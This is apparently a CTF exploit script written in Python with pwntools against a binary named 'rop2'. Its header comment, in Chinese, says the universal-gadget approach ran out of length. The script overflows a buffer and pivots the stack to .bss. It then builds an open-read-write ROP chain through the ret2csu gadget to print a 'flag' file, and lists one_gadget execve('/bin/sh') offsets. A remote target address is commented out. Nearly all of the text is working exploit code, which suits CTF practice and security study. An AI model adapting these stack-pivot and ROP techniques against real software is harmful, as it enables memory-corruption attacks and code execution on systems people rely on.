# 使用万能gadget，长度不够，无法完成

from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		# gdb.attach(p,x)
		gdb.attach(proc.pidof(p)[0])
		pause()
		
# p=remote('10.60.6.159',23306)
power_rop1=0x0000000000401476
power_rop2=0x0000000000401460
def getpower(avg1,avg2,avg3,got):
    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(avg1)+p64(avg2)+p64(avg3)+p64(got)
    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8
    return payload

p=process('rop2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('rop2')
ru(b'your choice:\n')
pause()
sl(b'4919')
bss=0x404440
print('bss',hex(bss))
payload=b'a'*0x100+p64(bss)+p64(0x0000000000401304)
sd(payload)
pause()
open_plt=elf.plt['open']
open_got=elf.got['open']
read_got=elf.got['read']
read_plt=elf.plt['read']
write_got=elf.got['write']
write_plt=elf.plt['write']

'''
ROPgadget --binary ./rop --only 'pop|ret' | grep rdi
0x0000000000401483 : pop rdi ; ret
0x0000000000401481 : pop rsi ; pop r15 ; ret
0x00000000004012a7 : leave ; ret
0x00000000004011fd : pop rbp ; ret
'''
pop_rdi=0x0000000000401483
pop_rsi_r15=0x0000000000401481
pop_rbp=0x00000000004011fd
leave_ret=0x00000000004012a7

'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
  '''

'''
bss=0x404340
  
'''
onegadget=0xe3afe
# orw_rop=flat([pop_rdi,1,pop_rsi_r15,write_got,write_got,write_plt,pop_rbp,bss+0x400,p64(0x0000000000401304),leave_ret])
# orw_rop=flat([pop_rdi,bss-0x100+0xf0,pop_rsi_r15,0,0,open_plt,pop_rbp,bss+0x400,leave_ret])
orw_rop=p64(bss+0x150)
orw_rop+=getpower(bss-0x100+0xf0,0,0,open_got)
orw_rop+=flat([pop_rdi,3,pop_rsi_r15,bss+0x40,0,read_plt,pop_rdi,1,pop_rsi_r15,bss+0x40,0,write_plt,leave_ret])
# orw_rop=flat([bss+0x150,pop_rsi_r15,0,0,pop_rdi,bss-0x100+0xf0,open_plt,pop_rdi,3,pop_rsi_r15,bss+0x40,0,read_plt,pop_rdi,1,pop_rsi_r15,bss+0x40,0,write_plt,leave_ret])
rop=orw_rop
# rop=flat([pop_rdi,1,pop_rsi_r15,write_got,write_got,write_plt])
rop=rop.ljust(0xf0,b'k')
rop+=b'flag\x00'
rop=rop.ljust(0x100,b'k')
payload2=rop+p64(bss-0x100)+p64(leave_ret)
gdba()
pause()
sd(payload2)
# p=remote()
pause()
onegadget1=0x88888888
onegadget2=0x55555555
payload3=b's'*0x100+p64(bss+0x200)+p64(leave_ret)
# sd(b'ffff')
# write_addr=uu64(rc(6))
# print('write_addr',hex(write_addr))
# libcbase=write_addr-libc.sym['write']
# print('libcbase',hex(libcbase))
pause()
sd(payload3)
ita()